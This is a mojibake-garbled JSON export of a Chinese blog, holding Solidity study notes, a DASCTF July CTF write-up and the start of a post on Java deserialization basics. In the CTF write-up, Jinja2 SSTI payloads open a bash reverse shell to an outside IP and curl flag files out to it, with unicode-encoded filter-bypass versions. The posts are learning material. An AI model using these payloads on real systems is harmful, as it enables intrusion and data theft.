ä¸ºå•ä½çš„ [åœ°å€ç±»å‹](https://solidity-cn.readthedocs.io/zh/develop/types.html#address) çš„ä½™é¢ã€‚\n\n- `<address>.transfer(uint256 amount)`:\n\n  å‘ [åœ°å€ç±»å‹](https://solidity-cn.readthedocs.io/zh/develop/types.html#address) å‘é€æ•°é‡ä¸º amount çš„ Weiï¼Œå¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸ï¼Œå‘é€ 2300 gas çš„çŸ¿å·¥è´¹ï¼Œä¸å¯è°ƒèŠ‚ã€‚\n\n- `<address>.send(uint256 amount) returns (bool)`:\n\n  å‘ [åœ°å€ç±»å‹](https://solidity-cn.readthedocs.io/zh/develop/types.html#address) å‘é€æ•°é‡ä¸º amount çš„ Weiï¼Œå¤±è´¥æ—¶è¿”å› `false`ï¼Œå‘é€ 2300 gas çš„çŸ¿å·¥è´¹ç”¨ï¼Œä¸å¯è°ƒèŠ‚ã€‚\n\n- `<address>.call(...) returns (bool)`:\n\n  å‘å‡ºä½çº§å‡½æ•° `CALL`ï¼Œå¤±è´¥æ—¶è¿”å› `false`ï¼Œå‘é€æ‰€æœ‰å¯ç”¨ gasï¼Œå¯è°ƒèŠ‚ã€‚\n\n- `<address>.callcode(...) returns (bool)`ï¼š\n\n  å‘å‡ºä½çº§å‡½æ•° `CALLCODE`ï¼Œå¤±è´¥æ—¶è¿”å› `false`ï¼Œå‘é€æ‰€æœ‰å¯ç”¨ gasï¼Œå¯è°ƒèŠ‚ã€‚\n\n- `<address>.delegatecall(...) returns (bool)`:\n\n  å‘å‡ºä½çº§å‡½æ•° `DELEGATECALL`ï¼Œå¤±è´¥æ—¶è¿”å› `false`ï¼Œå‘é€æ‰€æœ‰å¯ç”¨ gasï¼Œå¯è°ƒèŠ‚ã€‚\n\n### mappingå“ˆå¸Œè¡¨\n\n\n\nä½¿ç”¨è¯­æ³•\n\n`mapping(æ˜ å°„å…³ç³») å“ˆå¸Œè¡¨åç§°;`\n\n```solidity\npragma solidity^0.4.16;\n\ncontract mappingTest{\n    mapping(address => uint) idmap;\n    mapping(uint => string) namemap;\n    uint sum=0;\n    function register(string username){\n        address account=msg.sender;\n        sum++:\n        idmap[account]=sum;\n        namemap[sum]=username;\n    }\n}\n```\n\n### å‡½æ•°é‡è½½\n\nå½“ä½¿ç”¨ä¸åŒçš„å‚æ•°ï¼ˆæ•°é‡ï¼Œç±»å‹ï¼‰æ—¶å¯ä»¥è®©å‡½æ•°é‡è½½ï¼Œå¹¶ä¸”å¦‚åŒuint160ä¸addressè¿™æ ·çš„å‚æ•°ç±»å‹ä¹Ÿæ˜¯ç®—ä¸åŒå‚æ•°ç±»å‹ï¼Œå¯ä»¥ç¼–è¯‘é€šè¿‡ï¼Œä½†ä¼šæœ‰é—®é¢˜\n\nå½“ä½¿ç”¨ç¡®å®šå‚æ•°è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¦‚æœèƒ½åŒæ—¶åŒ¹é…å¤šä¸ªé‡è½½çš„å‡½æ•°ï¼Œä¼šç›´æ¥æŠ¥é”™ï¼Œå¦‚ä¸‹ä¾‹ï¼š![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140247208.png)\n\nåœ¨è¿™é‡Œtestå‡½æ•°è°ƒç”¨funå‡½æ•°æ—¶ä¼ å…¥äº†ä¸€ä¸ªç¡®å®šçš„å‚æ•°1ï¼ŒåŒæ—¶åŒ¹é…äº†uintç±»å‹å’Œuint8ç±»å‹ï¼Œæ­¤æ—¶å¯¼è‡´ç¼–è¯‘å¤±è´¥\n\nè€Œåœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¼ å…¥çš„æ˜¯`msg.sender`ï¼Œæ­¤æ—¶ç¼–è¯‘é€šè¿‡ï¼Œè¿è¡Œå‘ç°ç»“æœè¿”å›è°ƒç”¨äº†ä»¥addressä¸ºå‚æ•°ç±»å‹çš„funå‡½æ•°é‡è½½ï¼Œ~~ä¸ºå•¥å•Šæˆ‘ä¹Ÿä¸çŸ¥é“å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Š~~ï¼Œåé¢å†çœ‹å§ğŸ˜­![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140250890.png)\n\n### å‡½æ•°ä¼ å‚\n\nç±»ä¼¼pythonçš„ä¸¤ç§æ–¹æ³•ï¼Œä¸€æ˜¯æŒ‰ç…§å‡½æ•°å®šä¹‰çš„é¡ºåºç›´æ¥å¡«å…¥ï¼ŒäºŒæ˜¯é€šè¿‡èŠ±æ‹¬å·æŒ‡å®šä¼ å…¥å“ªä¸ªå½¢å‚ï¼Œå¦‚ä¸‹ä¾‹ï¼š\n\n```solidity\npragma solidity ^0.4.16;\n\ncontract parma{\n    uint public num;\n    string public name;\n    function setParam(uint _num,string _name){\n        num=_num;\n        name=_name;\n    }\n    function T1(){\n        setParam(18,\"J1an\");\n    }\n    function T2(){\n        setParam({_name:\"Ben\",_num:20});\n    }\n//    function T3(){\n//        setParam(100);\n//    }\n}\n```\n\nåœ¨ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼ŒT1ï¼ŒT2å½¢è±¡çš„è¯´æ˜äº†å‡½æ•°ä¼ å‚çš„æ–¹å¼ï¼Œå¹¶ä¸”å¦‚æœåŠ å…¥T3å‡½æ•°ä»£ç ä¼šå‘ç°ç¼–è¯‘æ— æ³•é€šè¿‡ï¼Œè¿™æ˜¯å› ä¸ºåœ¨åˆçº¦å†…éƒ¨çš„å‡½æ•°è°ƒç”¨å…¶ä»–å‡½æ•°æ—¶å¿…é¡»ä¸¥æ ¼æŒ‰ç…§å‡½æ•°å®šä¹‰çš„å½¢å‚ä¼ å…¥å‚æ•°ï¼Œä½†æˆ‘ä»¬åœ¨å°è¯•è®©ç”¨æˆ·ç›´æ¥å¯¹`setParam(100)`è¿›è¡Œè°ƒç”¨æ—¶ä¼šå‘ç°è°ƒç”¨æˆåŠŸäº†ï¼Œå¹¶ä¸”`_name`è¢«è‡ªåŠ¨èµ‹å€¼ä¸ºç©ºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š~~tmdè¿™ç§ç¿æ™ºå‚æ•°ä¼ é€’å¤šå°‘æœ‰ç‚¹å¤§ç—…~~![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140302099.png)\n\n### å‡½æ•°è¿”å›å€¼\n\nsolidityä¸­çš„å‡½æ•°å¯ä»¥æœ‰å¤šä¸ªè¿”å›å€¼\n\nå¦‚æœç»™äº†å‡½æ•°è¿”å›å€¼çš„å‚æ•°åï¼Œé‚£ä¹ˆè¿™ä¸ªå‚æ•°ä¼šä»¥ç±»ä¼¼å½¢å‚çš„æ–¹å¼ä¼ å…¥åˆ°å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸é€šè¿‡returnè€Œç›´æ¥ç»™è¿™ä¸ªå½¢å‚èµ‹å€¼æ¥è¾¾åˆ°è¿”å›å€¼çš„æ•ˆæœï¼Œè€Œå¦‚æœå½¢å‚ä¼ é€’å’ŒreturnåŒæ—¶å­˜åœ¨ï¼Œä»¥returnä¸ºå‡†ï¼Œ~~è¿™ä¸åºŸè¯å—è‚¯å®šreturnä¼˜å…ˆçº§é«˜å•Šï¼Œreturnç›¸å½“äºèµ‹å€¼äº†è¿˜æŠŠå‡½æ•°ç»™ç»“æŸäº†ï¼Œåé¢æ²¡æ“ä½œäº†å¯ä¸å®ƒé«˜å—~~\n\n```solidity\npragma solidity ^0.4.16;\n\ncontract funReturn{\n    function T1() returns(uint num){\n        return 1;\n    }\n    function T2() returns(uint num){\n        num=2;\n    }\n    function T3() returns(uint num){\n        num=3;\n        return 4;\n    }\n}\n```\n\n### å˜é‡ä½œç”¨åŸŸå’Œå€¼ä¼ é€’\n\nä½œç”¨åŸŸä»¥å°çš„ä¸ºå‡†\n\n### ä¿®é¥°ç¬¦\n\n`private`å‡½æ•°åªèƒ½è¢«åˆçº¦ç‹¬ç«‹ä½¿ç”¨ï¼Œä¸èƒ½è¢«ç»§æ‰¿\n\n`public`å‡½æ•°å¯ä»¥è¢«ä»»æ„è°ƒç”¨ï¼Œå¯ä»¥è¢«ç»§æ‰¿\n\n`internal`å‡½æ•°åªèƒ½åœ¨åˆçº¦å†…éƒ¨è°ƒç”¨ï¼Œä¸èƒ½ç›´æ¥åœ¨å¤–éƒ¨è°ƒç”¨ï¼Œå¯ä»¥è¢«ç»§æ‰¿\n\n`external`å‡½æ•°ä¸èƒ½åœ¨åˆçº¦å†…éƒ¨è¿›è¡Œè°ƒç”¨ï¼Œåªèƒ½åœ¨åˆçº¦å¤–éƒ¨è¢«è°ƒç”¨ï¼ˆåœ¨å‡½æ•°å†…éƒ¨å¯ä»¥é€šè¿‡thisæ¥é—´æ¥è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥é€šè¿‡newåˆ›å»ºæ–°åˆçº¦çš„æ–¹æ³•è°ƒç”¨ï¼‰ï¼Œå¯ä»¥è¢«ç»§æ‰¿\n\n`pure`ä¸æ¶ˆè€—gasï¼Œä¸ä¼šè¯»å–å…¨å±€å˜é‡ï¼Œä¹Ÿä¸ä¼šä¿®æ”¹å…¨å±€å˜é‡ï¼Œä¸€ä¸ªå›ºå®šè¾“å…¥å°±ä¼šæœ‰å›ºå®šè¾“å‡º\n\n`view`è¯»å–å…¨å±€å˜é‡ä½†ä¸ä¿®æ”¹ï¼Œä¸æ¶ˆè€—gas\n\n`payable`è¿›è¡Œé‡‘é’±äº¤æ˜“æ—¶æ‰€å¿…é¡»çš„ä¿®é¥°ç¬¦\n\n### å€¼ä¼ é€’å’Œå‰¯æœ¬æ‹·è´\n\nç›´æ¥å¦‚åŒa=bè¿™æ ·çš„ä¼ é€’éƒ½æ˜¯å€¼ä¼ é€’ï¼Œä¼ å…¥å‡½æ•°éƒ½æ˜¯å‰¯æœ¬æ‹·è´\n\n### constå¸¸é‡å®šä¹‰ï¼ˆå·²åºŸå¼ƒï¼‰\n\nå‡½æ•°ä¸­ä½¿ç”¨constantï¼ˆç‰ˆæœ¬ä¸º0.4.16ï¼‰ä¿®é¥°ï¼Œä¸æ¶ˆè€—gasï¼ˆä¸viewä¿®é¥°ç­‰ä»·ï¼Œå¹¶ä¸”å°†åœ¨0.5.0ç‰ˆæœ¬ä¸­åºŸå¼ƒï¼‰\n\nå¯¹äºå…¨å±€å˜é‡ï¼ˆå±€éƒ¨ä¸å¯ç”¨ï¼‰ä½¿ç”¨constantä¿®é¥°ï¼Œæ— æ³•è¢«æ›´æ”¹ï¼ˆå°±æ˜¯å¸¸é‡å®šä¹‰å˜›ï½ï½ï½ï¼‰\n\nå˜é‡å¹¶éæ‰€æœ‰ç±»å‹éƒ½å¯ä»¥ä½¿ç”¨å¸¸é‡æ˜¾ç¤ºï¼Œå¯ä½¿ç”¨çš„ç±»å‹æœ‰`int,uint,string,bytes1-32`\n\n### æ„é€ å‡½æ•°\n\næ„é€ å‡½æ•°ä¸åˆçº¦åŒåæˆ–è€…å‘½åä¸º`constructor`ï¼ˆæ–°ç‰ˆæœ¬ï¼‰ï¼Œé¦–å…ˆè¢«æ‰§è¡Œï¼Œæ„é€ å‡½æ•°ä¼ å‚éœ€è¦åœ¨åˆçº¦éƒ¨ç½²æ—¶èµ‹äºˆ\n\n### å‡½æ•°modifireï¼ˆå‡½æ•°ä¿®æ”¹å™¨ï¼‰\n\nrequireåˆ¤æ–­ï¼Œå¦‚æœrequireä¸­çš„å†…å®¹ä¸æˆç«‹ï¼Œé‚£ä¹ˆåé¢çš„ä»£ç éƒ½ä¸ä¼šè¢«æ‰§è¡Œå¹¶ä¸”å›æ»š\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208220048145.png)\n\næ­¤å¤„ä¾‹å­ä¸­ï¼Œåœ¨åˆçº¦éƒ¨ç½²æ—¶è®¾å®šäº†éƒ¨ç½²è€…ä¸ºåˆçº¦æ‹¥æœ‰è€…ï¼Œåœ¨modifierä¸­éªŒè¯äº†å‡½æ•°changeçš„èº«ä»½ï¼Œé¦–æ¬¡æˆ‘ä»¬è®©å‡½æ•°æ‹¥æœ‰è€…5B3è¿›è¡Œè°ƒç”¨å‘ç”µå‡½æ•°è°ƒç”¨æˆåŠŸï¼Œaçš„å€¼è¢«ä¿®æ”¹ï¼Œè€Œå½“æˆ‘ä»¬åˆ‡æ¢ç”¨æˆ·Ab8å†è¿›è¡Œè°ƒç”¨æ—¶ï¼Œä¼šå‘ç°è°ƒç”¨å¤±è´¥å¹¶ä¸”æŠ¥é”™\n\n```solidity\npragma solidity ^0.4.16;\ncontract modifierTest{\n    address public owner;\n    uint public a=100;\n    function modifierTest(){\n        owner=msg.sender;\n    }\n    modifier OnlyOwner{\n        require(msg.sender==owner);\n        _;\n    }\n    function change(uint _num)OnlyOwner{\n        a=_num;\n    }\n}\n```\n\n```solidity\nmodifier modifierName{\n    require(æ‰§è¡Œå‡½æ•°è¦æ±‚æ¡ä»¶);\n    _;//å ä½å‡½æ•°\n}\n//å‡½æ•°è°ƒç”¨\nfunction funName() modifierName{}\n//è¯¥å‡½æ•°æ‰§è¡Œæ—¶ä¼šå…ˆè¿›å…¥modifierè¿›è¡Œåˆ¤æ–­\n```\n\nç¬¬äºŒä¸ªåº”ç”¨ï¼Œåˆ¤æ–­ç”¨æˆ·æ³¨å†Œ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208220923409.png)\n\nè¿™ä¸ªä¾‹å­ä¸­æˆ‘ä»¬åœ¨æ³¨å†Œå‰å…ˆå¯¹å…¶è¦æ±‚è¯¥addresså¯¹åº”çš„idä¸º0ä¹Ÿå°±æ˜¯æœªæ³¨å†Œè¿‡æ‰å¯ä»¥è¿›å…¥æ³¨å†Œå‡½æ•°\n\n```solidity\npragma solidity ^0.4.16;\ncontract modifierTest{\n    address public owner;\n    uint sum=0;\n    mapping(address=>uint) idmap;\n    mapping(uint=>string) namemap;\n    function modifierTest(){\n        owner=msg.sender;\n    }\n    modifier OnlyOwner{\n        require(msg.sender==owner);\n        _;\n    }\n    modifier regConfirm{\n        require(idmap[msg.sender]==0);\n        _;\n    }\n    function register(string name) regConfirm{\n        address account=msg.sender;\n        sum++;\n        idmap[account]=sum;\n        namemap[sum]=name;\n    }\n}\n```\n\nç¬¬ä¸‰ä¸ªåº”ç”¨ï¼Œæƒé™ç®¡ç†ï¼Œä»£ç å°±ä¸æ”¾äº†è‡ªå·±æ„ä¼šå§\n\nmodifieræ‰§è¡Œé¡ºåºï¼Œåœ¨æœ‰å¤šä¸ªmodifierè¢«ä½¿ç”¨æ—¶ï¼Œåé¢çš„modifierä¼šä¸å‡½æ•°ä¸€èµ·è¢«æ”¾å…¥å‰ä¸€ä¸ªmodifierçš„`_;`å ä½ç¬¦ä¸­\n\n### åˆçº¦ç»§æ‰¿\n\nç»§æ‰¿è¯­æ³•\n\n```solidity\npragma solidity ^0.4.16;\ncontract father{\n}\ncontract son is father{\n}\n```\n\nå¯ä»¥è¿ç»­ç»§æ‰¿ï¼Œå¯å¤šé‡ç»§æ‰¿ï¼Œå¦‚æœæœ‰åŒåå±æ€§ä»¥æœ€åçš„åˆçº¦ä¸ºå‡†\n\n\n\nå¯¹äºå±æ€§å’Œå‡½æ•°æ¥è¯´privateä¸å¯è¢«ç»§æ‰¿\n\n### getterå‡½æ•°\n\npublicå±æ€§çš„å˜é‡ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŒåå±æ€§ä¸ºexternalçš„å‡½æ•°ï¼Œå¯¹äºmappingç±»å‹ç”Ÿæˆä¸€ä¸ªæœ‰å‚æ•°çš„å‡½æ•°ï¼Œä¼ \n\n### å›é€€å‡½æ•°fallback\n\nfallbackå‡½æ•°ï¼Œå›é€€å‡½æ•°ï¼Œæ˜¯åˆçº¦é‡Œçš„ç‰¹æ®Šæ— åå‡½æ•°ï¼Œæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªã€‚å®ƒåœ¨åˆçº¦è°ƒç”¨æ²¡æœ‰åŒ¹é…åˆ°å‡½æ•°ç­¾åï¼Œæˆ–è€…è°ƒç”¨æ²¡æœ‰å¸¦ä»»ä½•æ•°æ®æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ã€‚å›é€€å‡½æ•°æ˜¯åˆçº¦é‡Œçš„ç‰¹æ®Šå‡½æ•°ï¼Œæ²¡æœ‰åå­—ï¼Œä¸èƒ½æœ‰å‚æ•°ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚ä¸‹é¢æ¥çœ‹ä¸€ä¸ªç®€å•çš„å›é€€å‡½æ•°ä¾‹å­ã€‚\n\n```solidity\npragma solidity ^0.4.0;\n\ncontract SimpleFallback{\n  function(){\n    //fallback function\n  }\n}\n```\n\nå½“è°ƒç”¨çš„å‡½æ•°æ‰¾ä¸åˆ°æ—¶ï¼Œå°±ä¼šè°ƒç”¨é»˜è®¤çš„fallbackå‡½æ•°ã€‚ç”±äºSolidityä¸­ï¼ŒSolidityæä¾›äº†ç¼–è¯‘æœŸæ£€æŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥é€šè¿‡Solidityè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ã€‚ä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Solidityçš„æä¾›çš„åº•å±‚å‡½æ•°`address.call`æ¥æ¨¡æ‹Ÿè¿™ä¸€è¡Œä¸ºï¼Œå…³äº`call()`å‡½æ•°è¯¦è§ï¼šhttp://me.tryblockchain.org/Solidity-call-callcode-delegatecall.html ã€‚æˆ‘ä»¬æ¥çœ‹ä¸ªä¾‹å­ï¼š\n\n- **send()å‡½æ•°å‘é€ether**\n\nå½“æˆ‘ä»¬ä½¿ç”¨`address.send(ether to send)`å‘æŸä¸ªåˆçº¦ç›´æ¥è½¬å¸æ—¶ï¼Œç”±äºè¿™ä¸ªè¡Œä¸ºæ²¡æœ‰å‘é€ä»»ä½•æ•°æ®ï¼Œæ‰€ä»¥æ¥æ”¶åˆçº¦æ€»æ˜¯ä¼šè°ƒç”¨fallbackå‡½æ•°ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸‹é¢çš„ä¾‹å­\n\n### åˆçº¦é”€æ¯\n\nselfdestruct(owner);\n\n### storageå’Œmemory\n\nå…¨å±€å˜é‡è¢«å­˜åœ¨é“¾ä¸Šï¼Œå±äºstorageä¸­çš„å†…å®¹ï¼Œåœ¨å‡½æ•°ä¸­è¿è¡Œçš„å€¼éƒ½åªå­˜åœ¨æœ¬æœºä¸­ï¼Œå±äºmemoryä¸­å†…å®¹ï¼Œç”¨åå³é”€æ¯\n\nä½†æ˜¯åœ¨å‡½æ•°ä¸­å®šä¹‰çš„å¯å˜æ•°ç»„æ˜¯storageç±»å‹\n\n\n\n"},{"title":"DASCTF 7æœˆèµ›","url":"/posts/c1a72657.html","content":"\nè°¢è°¢å‡ºé¢˜äººï¼ŒSSTIğŸ¦ˆæˆ‘ï¼Œç­¾åˆ°å°±ä¸è¯´äº†ï¼Œç›´æ¥çœ‹åé¢ä¸¤ä¸ª\n\n## Harddisk\n\nSSTIï¼Œå°±æ˜¯è¿‡æ»¤å¾ˆè¿‡åˆ†ï¼Œç”šè‡³è¿˜æ»¤äº†gå’Œxè¿™ä¸¤ä¸ªå•å­—ç¬¦ï¼Œè¿˜è¿‡æ»¤äº†`{{}}`å’Œprintï¼Œæ³¨å®šæ˜¯æ²¡æœ‰å›æ˜¾äº†ï¼Œè¦åå¼¹shelläº†ï¼Œå…ˆè¯•è¯•æ„é€ æœ€ç®€å•çš„~~ï¼ˆåˆ«è¯´ä¸ºå•¥ä¸ç”¨åˆ«çš„ï¼Œéƒ½è¢«banäº†æˆ‘æ€ä¹ˆç”¨ğŸ˜­ï¼‰~~ `lipsum.__globals__['os'].popen('sh -i >& /dev/tcp/182.61.46.138/10000 0>&1').read()`\n\n```\n{%set a=\"__globals__\"%}\n{%set d=\"os\"%}\n{%set e=\"popen\"%}\n{%set c=\"bash -i >& /dev/tcp/182.61.46.138/10000 0>&1\"%}\n{%set f=\"get\"%}\n{%set b=((lipsum|attr(a))|attr(\"get\")(d))|attr(e)(c) %}\n```\n\nèµ°ä¸€æ³¢unicodeç¼–ç è¿˜æœ‰ç©ºæ ¼ç»•è¿‡ï¼Œå°±å˜æˆäº†è¿™æ ·\n\n```\n{%25set%09a=\"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\"%25}\n{%25set%09d=\"\\u006f\\u0073\"%25}\n{%25set%09e=\"\\u0070\\u006f\\u0070\\u0065\\u006e\"%25}\n{%25set%09c=\"\\u0062\\u0061\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0031\\u0038\\u0032\\u002e\\u0036\\u0031\\u002e\\u0034\\u0036\\u002e\\u0031\\u0033\\u0038\\u002f\\u0031\\u0030\\u0030\\u0030\\u0030\\u0020\\u0030\\u003e\\u0026\\u0031\"%25}\n{%25set%09f=\"\\u0067\\u0065\\u0074\"%25}\n{%25set%09b=((lipsum|attr(a))|attr(f)(d))|attr(e)(c)%25}\n```\n\næ‰§è¡Œå‡ºé”™äº†ï¼Œä¼°è®¡æ˜¯æ²¡å¯¼osæ¨¡å—ï¼Œèµ°importçš„è·¯å­å§ï¼ˆä¸çŸ¥é“ä¸ºå•¥shellåå¼¹ä¸è¿‡æ¥ï¼Œå°±ç”¨å­¦é•¿ç»™çš„curlå¤–å¸¦å§\n\n```\n{%set a=\"__globals__\"%}\n{%set b=\"__builtins__\"%}\n{%set cmd=\"__import__(\"os\").system(\"curl 182.61.46.138?`cat /f*`\")\"%}\n{%set c=(lipsum|attr(a))|attr(\"get\")(b)|attr(\"get\")(\"eval\")(cmd)%}\n```\n\nåŒä¸Šæ¢ä¸€ä¸‹æ ¼å¼\n\n```\n{%25set%09a=\"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\"%25}\n{%25set%09b=\"\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f\"%25}\n{%25set%09cmd=\"\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f\\u0028\\u0022\\u006f\\u0073\\u0022\\u0029\\u002e\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028\\u0022\\u0063\\u0075\\u0072\\u006c\\u0020\\u0031\\u0038\\u0032\\u002e\\u0036\\u0031\\u002e\\u0034\\u0036\\u002e\\u0031\\u0033\\u0038\\u003f\\u0060\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u002a\\u0060\\u0022\\u0029\"%25}\n{%25set%09c=(lipsum|attr(a))|attr(\"\\u0067\\u0065\\u0074\")(b)|attr(\"\\u0067\\u0065\\u0074\")(\"\\u0065\\u0076\\u0061\\u006c\")(cmd)%25}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207242303093.png)\n\n## ç»å¯¹é˜²å¾¡\n\nå‘œå‘œå‘œæˆ‘æ˜¯ç¬¨æ¯”ï¼Œæ‰¾åˆ°äº†æ–‡ä»¶éƒ½æ²¡æƒ³ç€ç›´æ¥æ‰“å¼€ä¸€ä¸‹ğŸ˜­\n\næ‰«ä¸å‡ºä¸œè¥¿å°±çœ‹çœ‹JSå§ï¼Œå…¶ä¸­ä¸€ä¸ªæ–‡ä»¶çš„APIå¸¦äº†phpæ–‡ä»¶`ImLib.API_PATH = \"/SUPPERAPI.php\";`ï¼Œçœ‹ä¸€ä¸‹ï¼Œæœ‰æºç \n\n```javascript\n<script>\n\nfunction getQueryVariable(variable)\n{\n       var query = window.location.search.substring(1);\n       var vars = query.split(\"&\");\n       for (var i=0;i<vars.length;i++) {\n               var pair = vars[i].split(\"=\");\n               if(pair[0] == variable){return pair[1];}\n       }\n       return(false);\n}\n\nfunction check(){\n\t\tvar reg = /[`~!@#$%^&*()_+<>?:\"{},.\\/;'[\\]]/im;\n        if (reg.test(getQueryVariable(\"id\"))) {\n            alert(\"æç¤ºï¼šæ‚¨è¾“å…¥çš„ä¿¡æ¯å«æœ‰éæ³•å­—ç¬¦ï¼\");\n            window.location.href = \"/\"\n         }\n}\ncheck()\n</script>\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["web"]},{"title":"Javaåºåˆ—åŒ–åŸºç¡€","url":"/posts/a3c4d7f5.html","content":"\n# Javaåºåˆ—åŒ–åŸºç¡€\n\n## åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\n\nåºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡å‹ç¼©ä¸ºå­—èŠ‚æµçš„å½¢å¼ï¼Œè€Œååºåˆ—åŒ–å°±æ˜¯å°†å­—èŠ‚æµè½¬æ¢å›å†…å­˜ä¸­çš„å¯¹è±¡\n\n### ä¸ºä»€ä¹ˆä¼šä¸å®‰å…¨\n\n- å¯¹äºJavaæ¥è¯´ï¼Œååºåˆ—åŒ–ä¸å®‰å…¨çš„ç‚¹ï¼Œæ˜¯åœ¨äºå…¶ååºåˆ—åŒ–æ—¶è¿›è¡Œäº†â€œé¢å¤–çš„æ“ä½œâ€ï¼ˆé‡å†™readObjectæ–¹æ³•ä¸­çš„å†…å®¹ï¼‰\n- å¯èƒ½çš„å±é™©å½¢å¼\n- å…¥å£ç±»çš„readObjectç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•\n- å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObjectæ—¶è°ƒç”¨\n- å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObjectæ—¶è°ƒç”¨ï¼Œæ¯”å¦‚åœ¨ç±»å‹ä¸ºObjectæ—¶è°ƒç”¨å¯¹åº”çš„equals/hashcode/toStringç­‰æ–¹æ³•\n- æ„é€ å‡½æ•°æˆ–é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ\n\n### ä¸€äº›æ¡ä»¶\n\nå…±åŒæ¡ä»¶ï¼šå®ç°Serializableæ¥å£\n\nå…¥å£ç±» sourceï¼ˆé‡å†™readObjectï¼Œå‚æ•°ç±»å‹å®½æ³›ï¼Œæœ€å¥½JDKè‡ªå¸¦ï¼‰\n\nè°ƒç”¨é“¾ gadget chain\n\næ‰§è¡Œç±» sink ï¼ˆRCEï¼ŒSSRFï¼Œå†™æ–‡ä»¶ç­‰ï¼‰\n\n### åå°„\n\nå®˜æ–¹é‡Šä¹‰ï¼šJavaçš„åå°„æœºåˆ¶æ˜¯æŒ‡åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»éƒ½èƒ½çŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œå¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½è°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºJavaçš„åå°„æœºåˆ¶\n\n**ä½œç”¨**\n\n- è®©Javaå…·æœ‰åŠ¨æ€æ€§\n- ä¿®æ”¹å·²æœ‰å¯¹è±¡çš„å±æ€§\n- åŠ¨æ€ç”Ÿæˆå¯¹è±¡\n- åŠ¨æ€è°ƒç”¨æ–¹æ³•\n- æ“ä½œå†…éƒ¨ç±»å’Œç§æœ‰æ–¹æ³•\n\nä¸€äº›åå°„æ–¹æ³•\n\n- `obj.getClass()`è·å–å¯¹è±¡ç±»Classå¯¹è±¡\n- `cla.getConstructor(å‚æ•°1ç±»å‹,å‚æ•°2ç±»å‹)`è·å–å¯¹è±¡æŒ‡å®šå½¢å¼çš„æ„é€ æ–¹æ³•Constructorå¯¹è±¡\n- `cst.newInstance(å‚æ•°1,å‚æ•°2)`é€šè¿‡æŒ‡å®šçš„æ„é€ æ–¹æ³•æ–°å»ºå¯¹ä¸€ä¸ªå¯¹åº”ç±»çš„å¯¹è±¡\n- `cls.getDeclaredFields()`è·å–æ‰€æœ‰ç±»ä¸­å£°æ˜çš„å˜é‡ï¼Œè¿”å›ä¸€ä¸ªFieldæ•°ç»„\n- `cls.getDeclaredField(å˜é‡å)`é€šè¿‡å˜é‡åè·å¾—è¯¥ç±»å˜é‡å¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ªFieldå¯¹è±¡\n- `fld.set(å¯¹è±¡,æ–°å˜é‡å€¼)`ç»™å¯¹è±¡è®¾ç½®æ–°å˜é‡å†…å®¹\n- `fld.setAccessible(å¸ƒå°”)`ç»™ç±»çš„å˜é‡è®¾ç½®è®¿é—®å±æ€§ï¼Œtrueä¸ºå¯è®¿é—®\n- `cls.getMethods()`è·å–ç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªMethodæ•°ç»„\n- 